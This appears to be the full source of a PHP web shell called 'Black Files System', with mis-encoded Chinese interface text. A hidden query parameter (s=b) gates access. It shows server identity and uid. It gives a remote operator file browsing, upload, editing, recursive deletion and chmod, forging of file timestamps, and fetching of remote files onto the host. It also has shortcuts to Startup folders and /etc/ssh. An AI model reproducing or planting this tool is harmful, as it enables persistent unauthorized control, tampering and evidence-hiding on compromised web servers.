<?php
header("content-Type: text/html; charset=gb2312");
error_reporting(0);
function strdir($str) { return str_replace(array('\\','//','%27','%22'),array('/','/','\'','"'),chop($str)); }
function chkgpc($array) { foreach($array as $key => $var) { $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var); } return $array; }
$myfile = $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
$myfile = strpos($myfile,'eval()') ? array_shift(explode('(',$myfile)) : $myfile;
define('THISDIR',strdir(dirname(__FILE__).'/'));
define('ROOTDIR',strdir(strtr($myfile,array(strdir($_SERVER['PHP_SELF']) => '')).'/'));
if(get_magic_quotes_gpc()) { $_POST = chkgpc($_POST); }
$win = substr(PHP_OS,0,3) == 'WIN' ? true : false;
$msg = 'Black Files System';

function filew($filename,$filedata,$filemode) {
	if((!is_writable($filename)) && file_exists($filename)) { chmod($filename,0666); }
	$handle = fopen($filename,$filemode);
	$key = fputs($handle,$filedata);
	fclose($handle);
	return $key;
}

function filer($filename) {
	$handle = fopen($filename,'r');
	$filedata = fread($handle,filesize($filename));
	fclose($handle);
	return $filedata;
}

function fileu($filenamea,$filenameb) {
	$key = move_uploaded_file($filenamea,$filenameb) ? true : false;
	if(!$key) { $key = copy($filenamea,$filenameb) ? true : false; }
	return $key;
}

function filed($filename) {
	if(!file_exists($filename)) return false;
	ob_end_clean();
	$name = basename($filename);
	$array = explode('.',$name);
	header('Content-type: application/x-'.array_pop($array));
	header('Content-Disposition: attachment; filename='.$name);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}

function showdir($dir) {
	$dir = strdir($dir.'/');
	if(($handle = @opendir($dir)) == NULL) return false;
	$array = array();
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		$name = strtr($name,array('\'' => '%27','"' => '%22'));
		if(is_dir($path)) { $array['dir'][$path] = $name; }
		else { $array['file'][$path] = $name; }
	}
	closedir($handle);
	return $array;
}

function deltree($dir) {
	$handle = @opendir($dir);
	while(false !== ($name = @readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		@chmod($path,0777);
		if(is_dir($path)) { deltree($path.'/'); }
		else { @unlink($path); }
	}
	@closedir($handle);
	return @rmdir($dir);
}

function size($bytes) {
	if($bytes < 1024) return $bytes.' B';
	$array = array('B','K','M','G','T');
	$floor = floor(log($bytes) / log(1024));
	return sprintf('%.2f '.$array[$floor],($bytes/pow(1024,floor($floor))));
}

function find($array,$string) {
	foreach($array as $key) { if(stristr($string,$key)) return true; }
	return false;
}

function subeval() {
	if(isset($_POST['getpwd'])) { echo '<input type="hidden" name="getpwd" value="'.$_POST['getpwd'].'">'; }
	if(isset($_POST['pass'])) { echo '<input type="hidden" name="pass" value="'.$_POST['pass'].'">'; }
	if(isset($_POST[$_POST['pass']])) { echo '<input type="hidden" name="'.$_POST['pass'].'" value="'.$_POST[$_POST['pass']].'">'; }
	if(isset($_POST['check'])) { echo '<input type="hidden" name="check" value="'.$_POST['check'].'">'; }
	return true;
}

if(isset($_POST['go'])) {
	if($_POST['go'] == 'down') {
		$downfile = $fileb = strdir($_POST['godir'].'/'.$_POST['govar']);
		if(!filed($downfile)) { $msg = '<h1>ÏÂÔØÎÄ¼þ²»´æÔÚ</h1>'; }
	}
}

?>
<?php
error_reporting(0);
if($_GET["s"]!="b"){
	exit();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<style type="text/css">
* {margin:0px;padding:0px;}
body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}
a{color:#000000;text-decoration:none;vertical-align:middle;}
a:hover{color:#FF0000;text-decoration:underline;}
p {padding:1px;line-height:1.6em;}
h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}
h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}
form {display:inline;}
input,select { vertical-align:middle; }
input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}
input[type=submit], input[type=button] {height:21px;}
.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}
.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}
.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}
.main {width:963px;margin:0 auto;padding:10px;}
.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}
.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}
.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}
.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}
.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}
.tables {width:100%;}
.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}
.tables td {background:#F9F6F4;height:19px;padding-left:2px;}
</style>
<script type="text/javascript">
function $(ID) { return document.getElementById(ID); }
function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }
function cd(dir) { dir = sd(dir); $('dir').value = dir; $('frm').submit(); }
function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }
function go(a,b) { b = sd(b); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } 
function nf(a,b) { re = prompt("ÐÂ½¨Ãû",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } 
function dels(a) { if(a == 'b') { var msg = "ËùÑ¡ÎÄ¼þ"; $('act').value = a; } else { var msg = "Ä¿Â¼"; $('act').value = 'deltree'; $('var').value = a; } if(confirm("È·¶¨ÒªÉ¾³ý"+msg+"Âð")) { $('frm1').submit(); } }
function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }
function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }
</script>
<title><?php echo VERSION.' - '.date('Y-m-d H:i:s',time())?></title>
</head>
<body>
<div class="main">
	<div class="outl">
	<div class="toptag"><?php echo ($_SERVER['SERVER_ADDR'] ? $_SERVER['SERVER_ADDR'] : gethostbyname($_SERVER['SERVER_NAME'])).' - '.php_uname().' - whoami('.get_current_user().') - ¡¾uid('.getmyuid().') gid('.getmygid().')¡¿'; if(isset($issql)) echo ' - ¡¾'.$issql.'¡¿';?></div>
<?php 
error_reporting(0);
@ini_set('max_execution_time',20000);
@ini_set('memory_limit','256M');
$go = array_key_exists($_POST['go'],$menu) ? $_POST['go'] : 'file';
$nowdir = isset($_POST['dir']) ? strdir(chop($_POST['dir']).'/') : THISDIR;

echo '<form name="gofrm" id="gofrm" method="POST">';
subeval();
echo '<input type="hidden" name="go" id="go" value="">';
echo '<input type="hidden" name="godir" id="godir" value="'.$nowdir.'">';
echo '<input type="hidden" name="govar" id="govar" value="">';
echo '</form>';

switch($_POST['go']) {
case "edit" : case "editor" : 
$file = strdir($_POST['godir'].'/'.$_POST['govar']);
$iconv = function_exists('iconv');
if(!file_exists($file)) {
	$msg = '¡¾ÐÂ½¨ÎÄ¼þ¡¿';
} else {
	$code = filer($file);
	$chst = 'Ä¬ÈÏ';
	if(preg_match('~[\x{4e00}-\x{9fa5}]+~u',$code) && $iconv) { $chst = 'utf-8'; $code = @iconv('UTF-8','GB2312//IGNORE',$code); }
	$size = size(filesize($file));
	$msg = '¡¾ÎÄ¼þÊôÐÔ '.substr(decoct(fileperms($file)),-4).'¡¿ ¡¾ÎÄ¼þ´óÐ¡ '.$size.'¡¿ ¡¾ÎÄ¼þ±àÂë '.$chst.'¡¿';
}
echo '<div class="msgbox"><input name="keyword" id="keyword" type="text" style="width:138px;height:15px;"><input type="button" value="IE²éÕÒÄÚÈÝ" onclick="search($(\'keyword\').value);"> - '.$msg.'</div>';
echo '<form name="editfrm" id="editfrm" method="POST">';
subeval();
echo '<input type="hidden" name="go" value=""><input type="hidden" name="act" id="act" value="edit">';
echo '<input type="hidden" name="dir" id="dir" value="'.dirname(__FILE__).'">';
echo '<div class="actall">ÎÄ¼þ <input type="text" name="filename" value="'.$file.'" style="width:528px;"> ';
if($iconv) {
	echo '±àÂë <select name="tostr">';
	$selects = array('normal' => 'Ä¬ÈÏ','utf' => 'utf-8');
	foreach($selects as $var => $name) { echo '<option value="'.$var.'"'.($name == $chst ? ' selected' : '').'>'.$name.'</option>'; }
	echo '</select>';
}
echo '</div><div class="actall"><textarea name="filecode" id="filecode" style="width:698px;height:358px;">'.htmlspecialchars($code).'</textarea></div></form>';
echo '<div class="actall" style="padding:5px;padding-right:68px;"><input type="button" onclick="$(\'editfrm\').submit();" value="±£´æ" style="width:80px;"> ';
echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="'.dirname(__FILE__).'">';
subeval();
echo '<input type="button" onclick="$(\'backfrm\').submit();" value="·µ»Ø" style="width:80px;"></form></div>';
break;

case "upfiles" : 
$updir = isset($_POST['updir']) ? $_POST['updir'] : $_POST['godir'];
$msg = '¡¾×î´óÉÏ´«ÎÄ¼þ '.get_cfg_var("upload_max_filesize").'¡¿ ¡¾POST×î´óÌá½»Êý¾Ý '.get_cfg_var("post_max_size").'¡¿';
$max = 10;
if(isset($_FILES['uploads']) && isset($_POST['renames'])) {
	$uploads = $_FILES['uploads'];
	$msgs = array();
	for($i = 1;$i < $max;$i++) {
		if($uploads['error'][$i] == UPLOAD_ERR_OK) {
			$rename = $_POST['renames'][$i] == '' ? $uploads['name'][$i] : $_POST['renames'][$i];
			$filea = $uploads['tmp_name'][$i];
			$fileb = strdir($updir.'/'.$rename);
			$msgs[$i] = fileu($filea,$fileb) ? '<br><h2>ÉÏ´«³É¹¦ '.$rename.'</h2>' : '<br><h1>ÉÏ´«Ê§°Ü '.$rename.'</h1>';
		}
	}
}
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form name="upsfrm" id="upsfrm" method="POST" enctype="multipart/form-data">';
subeval();
echo '<input type="hidden" name="go" value="upfiles"><input type="hidden" name="act" id="act" value="upload">';
echo '<div class="actall"><p>ÉÏ´«µ½Ä¿Â¼ <input type="text" name="updir" style="width:398px;" value="'.$updir.'"></p>';
for($i = 1;$i < $max;$i++) { echo '<p>¸½¼þ'.$i.' <input type="file" name="uploads['.$i.']" style="width:300px;"> ÖØÃüÃû <input type="text" name="renames['.$i.']" style="width:128px;"> '.$msgs[$i].'</p>'; }
echo '</div></form><div class="actall" style="padding:8px;padding-right:68px;"><input type="button" onclick="$(\'upsfrm\').submit();" value="ÉÏ´«" style="width:80px;"> ';
echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="'.$updir.'">';
subeval();
echo '<input type="button" onclick="$(\'backfrm\').submit();" value="·µ»Ø" style="width:80px;"></form></div>';
break;

default : 

if(isset($_FILES['upfile'])) {
	if($_FILES['upfile']['name'] == '') { $msg = '<h1>ÇëÑ¡ÔñÎÄ¼þ</h1>'; }
	else { $rename = $_POST['rename'] == '' ? $_FILES['upfile']['name'] : $_POST['rename']; $filea = $_FILES['upfile']['tmp_name']; $fileb = strdir($nowdir.$rename); $msg = fileu($filea,$fileb) ? '<h2>ÉÏ´«ÎÄ¼þ'.$rename.'³É¹¦</h2>' : '<h1>ÉÏ´«ÎÄ¼þ'.$rename.'Ê§°Ü</h1>'; }
}

if(isset($_POST['act'])) {
	switch($_POST['act']) {
		case "b" : 
			if(!$_POST['files']) { $msg = '<h1>ÇëÑ¡ÔñÎÄ¼þ</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @unlink(strdir($nowdir.$filename)) ? 1 : 0; } $msg = $i ? '<h2>¹²É¾³ý '.$i.' ¸öÎÄ¼þ³É¹¦</h2>' : '<h1>¹²É¾³ý '.$i.' ¸öÎÄ¼þÊ§°Ü</h1>'; }
		break;
		case "c" : 
			if(!$_POST['files']) { $msg = '<h1>ÇëÑ¡ÔñÎÄ¼þ '.$_POST['var'].'</h1>'; }
			elseif(!ereg("^[0-7]{4}$",$_POST['var'])) { $msg = '<h1>ÊôÐÔÖµ´íÎó</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @chmod(strdir($nowdir.$filename),base_convert($_POST['var'],8,10)) ? 1 : 0; } $msg = $i ? '<h2>¹² '.$i.' ¸öÎÄ¼þÐÞ¸ÄÊôÐÔÎª'.$_POST['var'].'³É¹¦</h2>' : '<h1>¹² '.$i.' ¸öÎÄ¼þÐÞ¸ÄÊôÐÔÎª'.$_POST['var'].'Ê§°Ü</h1>'; }
		break;
		case "d" : 
			if(!$_POST['files']) { $msg = '<h1>ÇëÑ¡ÔñÎÄ¼þ '.$_POST['var'].'</h1>'; }
			elseif(!preg_match('/(\d+)-(\d+)-(\d+) (\d+):(\d+):(\d+)/',$_POST['var'])) { $msg = '<h1>Ê±¼ä¸ñÊ½´íÎó '.$_POST['var'].'</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @touch(strdir($nowdir.$filename),strtotime($_POST['var'])) ? 1 : 0; } $msg = $i ? '<h2>¹² '.$i.' ¸öÎÄ¼þÐÞ¸ÄÊ±¼äÎª'.$_POST['var'].'³É¹¦</h2>' : '<h1>¹² '.$i.' ¸öÎÄ¼þÐÞ¸ÄÊ±¼äÎª'.$_POST['var'].'Ê§°Ü</h1>'; }
		break;
		case "e" : 
			$path = strdir($nowdir.$_POST['var'].'/');
			if(file_exists($path)) { $msg = '<h1>Ä¿Â¼ÒÑ´æÔÚ '.$_POST['var'].'</h1>'; }
			else { $msg = @mkdir($path,0777) ? '<h2>´´½¨Ä¿Â¼ '.$_POST['var'].' ³É¹¦</h2>' : '<h1>´´½¨Ä¿Â¼ '.$_POST['var'].' Ê§°Ü</h1>'; }
		break;
		case "f" : 
			$context = array('http' => array('timeout' => 30));
			if(function_exists('stream_context_create')) { $stream = stream_context_create($context); }
			$data = @file_get_contents ($_POST['var'],false,$stream);
			$filename = array_pop(explode('/',$_POST['var']));
			if($data) { $msg = filew(strdir($nowdir.$filename),$data,'wb') ? '<h2>ÏÂÔØ '.$filename.' ³É¹¦</h2>' : '<h1>ÏÂÔØ '.$filename.' Ê§°Ü</h1>'; } else { $msg = '<h1>ÏÂÔØÊ§°Ü»ò²»Ö§³ÖÏÂÔØ</h1>'; }
		break;
		case "rf" : 
			$files = explode('|x|',$_POST['var']);
			if(count($files) != 2) { $msg = '<h1>ÊäÈë´íÎó</h1>'; }
			else { $msg = @rename(strdir($nowdir.$files[1]),strdir($nowdir.$files[0])) ? '<h2>ÖØÃüÃû '.$files[1].' Îª '.$files[0].' ³É¹¦</h2>' : '<h1>ÖØÃüÃû '.$files[1].' Îª '.$files[0].' Ê§°Ü</h1>'; }
		break;
		case "pd" : 
			$files = explode('|x|',$_POST['var']);
			if(count($files) != 2) { $msg = '<h1>ÊäÈë´íÎó</h1>'; }
			else { $path = strdir($nowdir.$files[1]); $msg = @chmod($path,base_convert($files[0],8,10)) ? '<h2>ÐÞ¸Ä'.$files[1].'ÊôÐÔÎª'.$files[0].'³É¹¦</h2>' : '<h1>ÐÞ¸Ä'.$files[1].'ÊôÐÔÎª'.$files[0].'Ê§°Ü</h1>'; }
		break;
		case "edit" : 
			if(isset($_POST['filename']) && isset($_POST['filecode'])) { if($_POST['tostr'] == 'utf') { $_POST['filecode'] = @iconv('GB2312//IGNORE','UTF-8',$_POST['filecode']); } $msg = filew($_POST['filename'],$_POST['filecode'],'w') ? '<h2>±£´æ³É¹¦ '.$_POST['filename'].'</h2>' : '<h1>±£´æÊ§°Ü '.$_POST['filename'].'</h1>'; }
		break;
		case "deltree" : 
			$deldir = strdir($nowdir.$_POST['var'].'/');
			if(!file_exists($deldir)) { $msg = '<h1>Ä¿Â¼ '.$_POST['var'].' ²»´æÔÚ</h1>'; }
			else { $msg = deltree($deldir) ? '<h2>É¾³ýÄ¿Â¼ '.$_POST['var'].' ³É¹¦</h2>' : '<h1>É¾³ýÄ¿Â¼ '.$_POST['var'].' Ê§°Ü</h1>'; }
		break;
	}
}

$chmod = substr(decoct(fileperms($nowdir)),-4);
if(!$chmod) { $msg .= ' - <h1>ÎÞ·¨¶ÁÈ¡Ä¿Â¼</h1>'; }

$array = showdir($nowdir);
$thisurl = strdir('/'.strtr($nowdir,array(ROOTDIR => '')).'/');
$nowdir = strtr($nowdir,array('\'' => '%27','"' => '%22'));
echo '<div class="msgbox">'.$msg.'</div>';
echo '<div class="actall"><form name="frm" id="frm" method="POST">';
subeval();
echo (is_writable($nowdir) ? '<h2>Â·¾¶</h2>' : '<h1>Â·¾¶</h1>').' <input type="text" name="dir" id="dir" style="width:508px;" value="'.strdir($nowdir.'/').'"> ';
echo '<input type="button" onclick="$(\'frm\').submit();" style="width:50px;" value="×ªµ½"> ';
echo '<input type="button" onclick="cd(\''.ROOTDIR.'\');" style="width:68px;" value="¸ùÄ¿Â¼"> ';
echo '<input type="button" onclick="cd(\''.THISDIR.'\');" style="width:68px;" value="³ÌÐòÄ¿Â¼"> ';
echo '<select onchange="cd(options[selectedIndex].value);">';
echo '<option>---ÌØÊâÄ¿Â¼---</option>';
echo '<option value="C:/RECYCLER/">Win-RECYCLER</option>';
echo '<option value="C:/$Recycle.Bin/">Win-$Recycle</option>';
echo '<option value="C:/Program Files/">Win-Program</option>';
echo '<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup/">Win-Startup</option>';
echo '<option value="C:/Documents and Settings/All Users/¡¸¿ªÊ¼¡¹²Ëµ¥/³ÌÐò/Æô¶¯/">Win-Æô¶¯</option>';
echo '<option value="C:/Windows/Temp/">Win-TEMP</option>';
echo '<option value="/usr/local/">Linux-local</option>';
echo '<option value="/tmp/">Linux-tmp</option>';
echo '<option value="/var/tmp/">Linux-var</option>';
echo '<option value="/etc/ssh/">Linux-ssh</option>';
echo '</select></form></div><div class="actall">';

echo '<input type="button" value="ÐÂ½¨ÎÄ¼þ" onclick="nf(\'edit\',\'newfile.php\');" style="width:68px;"> ';
echo '<input type="button" value="´´½¨Ä¿Â¼" onclick="txts(\'Ä¿Â¼Ãû\',\'newdir\',\'e\');" style="width:68px;"> ';
echo '<input type="button" value="ÏÂÔØÎÄ¼þ" onclick="txts(\'ÏÂÔØÎÄ¼þµ½µ±Ç°Ä¿Â¼\',\'http://www.baidu.com/index.html\',\'f\');" style="width:68px;"> ';
echo '<input type="button" value="ÅúÁ¿ÉÏ´«" onclick="go(\'upfiles\',\''.$nowdir.'\');" style="width:68px;"> ';

echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
subeval();
echo '<input type="hidden" name="dir" id="dir" value="'.$nowdir.'">';
echo '<input type="file" name="upfile" style="width:286px;height:21px;"> ';
echo '<input type="button" onclick="$(\'upfrm\').submit();" value="ÉÏ´«" style="width:50px;"> ';
echo 'ÉÏ´«ÖØÃüÃûÎª <input type="text" name="rename" style="width:128px;">';
echo '</form></div>';

echo '<form name="frm1" id="frm1" method="POST"><table class="tables">';
subeval();
echo '<input type="hidden" name="dir" id="dir" value="'.$nowdir.'">';
echo '<input type="hidden" name="act" id="act" value="">';
echo '<input type="hidden" name="var" id="var" value="">';
echo '<th>ÎÄ¼þÃû³Æ</th><th style="width:8%">²Ù×÷</th><th style="width:5%">ÊôÐÔ</th><th style="width:17%">´´½¨Ê±¼ä</th><th style="width:17%">ÐÞ¸ÄÊ±¼ä</th><th style="width:8%">ÏÂÔØ</th>';
if($array) {
	asort($array['dir']);
	asort($array['file']);
	$dnum = $fnum = 0;
	foreach($array['dir'] as $path => $name) {
		$prem = substr(decoct(fileperms($path)),-4);
		$ctime = date('Y-m-d H:i:s',filectime($path));
		$mtime = date('Y-m-d H:i:s',filemtime($path));
		echo '<tr>';
		echo '<td><a href="javascript:cd(\''.$nowdir.$name.'\');"><b>'.strtr($name,array('%27' => '\'','%22' => '"')).'</b></a></td>';
		echo '<td><a href="javascript:dels(\''.$name.'\');">É¾³ý</a> ';
		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">¸ÄÃû</a></td>';
		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
		echo '<td>'.$ctime.'</td>';
		echo '<td>'.$mtime.'</td>';
		echo '<td>-</td>';
		echo '</tr>';
		$dnum++;
	}
	foreach($array['file'] as $path => $name) {
		$prem = substr(decoct(fileperms($path)),-4);
		$ctime = date('Y-m-d H:i:s',filectime($path));
		$mtime = date('Y-m-d H:i:s',filemtime($path));
		$size = size(filesize($path));
		echo '<tr>';
		echo '<td><input type="checkbox" name="files[]" value="'.$name.'"><a target="_blank" href="'.$thisurl.$name.'">'.strtr($name,array('%27' => '\'','%22' => '"')).'</a></td>';
		echo '<td><a href="javascript:go(\'edit\',\''.$name.'\');">±à¼­</a> ';
		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">¸ÄÃû</a></td>';
		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
		echo '<td>'.$ctime.'</td>';
		echo '<td>'.$mtime.'</td>';
		echo '<td align="right"><a href="javascript:go(\'down\',\''.$name.'\');">'.$size.'</a></td>';
		echo '</tr>';
		$fnum++;
	}
}
unset($array);
echo '</table>';
echo '<div class="actall" style="text-align:left;">';
echo '<input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> ';
echo '<input type="button" value="É¾³ý" style="width:50px;" onclick=\'dels("b");\'> ';
echo '<input type="button" value="ÊôÐÔ" style="width:50px;" onclick=\'txts("ÊôÐÔÖµ","0666","c");\'> ';
echo '<input type="button" value="Ê±¼ä" style="width:50px;" onclick=\'txts("ÐÞ¸ÄÊ±¼ä","'.$mtime.'","d");\'> ';
echo 'Ä¿Â¼['.$dnum.'] - ÎÄ¼þ['.$fnum.'] - ÊôÐÔ['.$chmod.']</div></form>';
break;
}
?>
